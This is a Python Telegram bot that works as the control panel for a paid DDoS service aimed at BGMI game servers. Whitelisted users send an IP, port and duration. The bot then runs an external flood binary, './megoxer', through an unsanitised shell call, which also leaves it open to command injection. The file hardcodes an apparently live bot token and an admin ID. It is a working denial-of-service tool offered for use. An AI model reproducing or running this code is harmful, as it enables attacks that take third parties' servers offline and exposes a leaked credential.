import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '8016978575:AAGtZq2YIQKIdUuDsx-tb8APm5_SPystyTs'
ADMIN_USER_ID = 1662672529
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 彡[Lala∆_∆PvT×DDOS°°🦅]彡 𝗗𝗱𝗼𝘀*\n"
        "*🔥 𝗢𝘄𝗻𝗲𝗿 @Vansh_Rathor*\n"
        "*🔥 SERVER BGMI*\n"    
        "*🔥 𝗨𝘀𝗲 /attack 𝗙𝗼𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗗𝗱𝗼𝘀*"                  
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗚𝗲𝘁 𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗼𝗻 𝗙𝗼𝗿 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗗𝗠 » @Vansh_Rathor*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*👤 𝗨𝗦𝗘𝗦𝗘 » /approve add <chat_id> 𝗙𝗼𝗿 𝗔𝗱𝗱 𝗡𝗲𝘄 𝗨𝘀𝗲𝗿 /approve remove <chat_id> 𝗙𝗼𝗿 𝗥𝗲𝗺𝗼𝘃𝗲 𝗢𝗹𝗱 𝗨𝘀𝗲𝗿*", parse_mode='Markdown')
        return

    command, target_id = args
    target_id = target_id.strip()

    if command == 'add':
        if target_id in users:
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User {target_id} is already authorized.*", parse_mode='Markdown')
            return
        users.add(target_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_id} added.*", parse_mode='Markdown')

    elif command == 'remove':
        if target_id not in users:
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User {target_id} is not authorized.*", parse_mode='Markdown')
            return
        users.discard(target_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_id} removed.*", parse_mode='Markdown')

async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗚𝗲𝘁 𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗼𝗻 𝗙𝗼𝗿 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗗𝗠 » @Vansh_Rathor*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*👤 𝗨𝗦𝗘𝗦𝗘 » /remove <chat_id> 𝗙𝗼𝗿 𝗥𝗲𝗺𝗼𝘃𝗲 𝗨𝘀𝗲𝗿*", parse_mode='Markdown')
        return

    target_id = args[0].strip()

    if target_id not in users:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User {target_id} is not authorized.*", parse_mode='Markdown')
        return

    users.discard(target_id)
    save_users(users)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_id} removed.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, time, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./megoxer {ip} {port} {time}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed ✅*\n*🔥 Owner @Vansh_Rathor*\n*🔥 SERVER BGMI*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*🤡 𝐘𝐨𝐮 𝐍𝐞𝐞𝐝 𝐓𝐨 𝐆𝐞𝐭 𝐏𝐞𝐫𝗺𝐢𝐬𝐬𝗼𝐧 𝐓𝐨 𝐔𝐬𝗲 𝐓𝐡𝐢𝘀 𝐁𝗼𝐭 » @Vansh_Rathor*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⭐ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 3 𝐓𝐨 5 𝐌𝐢𝐧𝐮𝐭𝐞 𝐅𝐨𝐫 𝐍𝐞𝐱𝐭 𝐀𝐭𝐭𝐚𝐜𝐤 /attack*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*🌟 Uses » /attack ip port time*", parse_mode='Markdown')
        return

    ip, port, time = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗢𝗨𝗡𝗖𝗛𝗘𝗗 ✅*\n"
        f"*⭐ 𝗧𝗮𝗿𝗴𝗲𝘁 » {ip}*\n"
        f"*⭐ 𝗣𝗼𝗿𝘁 » {port}*\n"
        f"*⭐ 𝗧𝗶𝗺𝗲 » {time} seconds*\n"
        f"*🔥 𝗢𝘄𝗻𝗲𝗿 @Vansh_Rathor*\n"        
        f"*🔥 SERVER BGMI*"           
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))  # Add the remove handler
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()
